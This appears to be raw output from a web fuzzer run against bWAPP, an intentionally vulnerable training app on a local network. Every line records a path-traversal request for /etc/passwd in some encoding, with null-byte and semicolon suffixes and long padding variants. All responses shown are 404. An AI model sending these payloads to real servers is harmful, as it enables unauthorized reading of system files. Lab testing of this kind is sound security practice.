70,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd
325,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
323,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c/etc/passwd%00index.html
322,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c/etc/passwd%00index.html
324,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
327,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
333,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
332,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
328,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\/etc/passwd%00index.html
329,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\/etc/passwd%00index.html
383,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html
384,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e//etc/passwd;index.html
385,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e//etc/passwd;index.html
386,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
369,404,9L,39W,http://192.168.1.86/bWAPP/../..//etc/passwd;index.html
355,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
357,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
356,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
342,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
344,404,9L,39W,http://192.168.1.86/bWAPP/..%255c/etc/passwd%00index.html
363,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
343,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
377,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f/etc/passwd;index.html
375,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../..//etc/passwd;index.html
376,404,9L,39W,http://192.168.1.86/bWAPP/..%2f/etc/passwd;index.html
359,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
346,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c/etc/passwd%00index.html
360,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c/etc/passwd%00index.html
347,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c/etc/passwd%00index.html
374,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../..//etc/passwd;index.html
372,404,9L,39W,http://192.168.1.86/bWAPP/../../../../..//etc/passwd;index.html
373,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../..//etc/passwd;index.html
370,404,9L,39W,http://192.168.1.86/bWAPP/../../..//etc/passwd;index.html
371,404,9L,39W,http://192.168.1.86/bWAPP/../../../..//etc/passwd;index.html
368,404,9L,39W,http://192.168.1.86/bWAPP/..//etc/passwd;index.html
367,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
365,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
364,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
366,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
353,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\/etc/passwd%00index.html
349,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd%00index.html
351,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd%00index.html
348,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c/etc/passwd%00index.html
352,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\/etc/passwd%00index.html
387,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
388,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
354,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
335,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
341,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
389,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
390,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
391,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd;index.html
409,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e//etc/passwd;index.html
417,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
408,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e//etc/passwd;index.html
392,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f/etc/passwd;index.html
393,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
394,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
395,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
396,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
397,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
398,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
399,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd;index.html
400,404,9L,39W,http://192.168.1.86/bWAPP/..%252f/etc/passwd;index.html
401,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f/etc/passwd;index.html
402,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f/etc/passwd;index.html
403,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f/etc/passwd;index.html
404,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f/etc/passwd;index.html
423,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
405,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd;index.html
406,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd;index.html
407,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd;index.html
433,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c/etc/passwd;index.html
432,404,9L,39W,http://192.168.1.86/bWAPP/..%5c/etc/passwd;index.html
422,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
426,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\/etc/passwd;index.html
425,404,9L,39W,http://192.168.1.86/bWAPP/..\..\/etc/passwd;index.html
429,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\/etc/passwd;index.html
428,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\/etc/passwd;index.html
421,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
427,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\/etc/passwd;index.html
412,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
411,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
418,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
350,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd%00index.html
410,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
413,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
380,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html
381,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html
382,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html
358,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd%00index.html
345,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c/etc/passwd%00index.html
424,404,9L,39W,http://192.168.1.86/bWAPP/..\/etc/passwd;index.html
440,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\/etc/passwd;index.html
450,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
439,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html
445,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
444,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
446,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
431,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\..\/etc/passwd;index.html
430,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\/etc/passwd;index.html
434,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c/etc/passwd;index.html
436,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html
435,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c/etc/passwd;index.html
443,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
442,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
438,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html
437,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html
361,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
415,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
414,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd;index.html
334,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
339,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
362,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd%00index.html
326,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
416,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f/etc/passwd;index.html
378,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f/etc/passwd;index.html
420,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
419,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html
379,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f/etc/passwd;index.html
336,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c/etc/passwd%00index.html
337,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
112,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%af/etc/passwd
186,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
338,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
449,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
448,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c/etc/passwd;index.html
455,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
447,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd;index.html
452,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
451,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
453,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
454,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
330,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
69,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c/etc/passwd
158,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
464,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\/etc/passwd;index.html
465,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\/etc/passwd;index.html
466,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
467,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
460,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c/etc/passwd;index.html
461,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd;index.html
458,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c/etc/passwd;index.html
459,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c/etc/passwd;index.html
463,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd;index.html
462,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd;index.html
456,404,9L,39W,http://192.168.1.86/bWAPP/..%255c/etc/passwd;index.html
264,404,9L,39W,http://192.168.1.86/bWAPP/..%2f/etc/passwd%00index.html
31,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
457,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c/etc/passwd;index.html
59,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\/etc/passwd
478,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
476,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
58,404,9L,39W,http://192.168.1.86/bWAPP/..\..\/etc/passwd
331,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd%00index.html
57,404,9L,39W,http://192.168.1.86/bWAPP/..\/etc/passwd
66,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c/etc/passwd
477,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
472,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c/etc/passwd;index.html
468,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
481,404,9L,39W,http://192.168.1.86/bWAPP/\../\..//etc/passwd
487,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../\../\../\..//etc/passwd
475,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
486,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../\../\..//etc/passwd
488,404,9L,39W,http://192.168.1.86/bWAPP//..\/etc/passwd
474,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
483,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\..//etc/passwd
484,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\..//etc/passwd
492,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\/etc/passwd
493,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\/..\/etc/passwd
491,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/etc/passwd
485,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../\..//etc/passwd
479,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
490,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/etc/passwd
482,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\..//etc/passwd
469,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
489,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/etc/passwd
471,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
470,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
496,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd
495,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\/..\/..\/..\/etc/passwd
494,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\/..\/..\/etc/passwd
497,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../..//etc/passwd
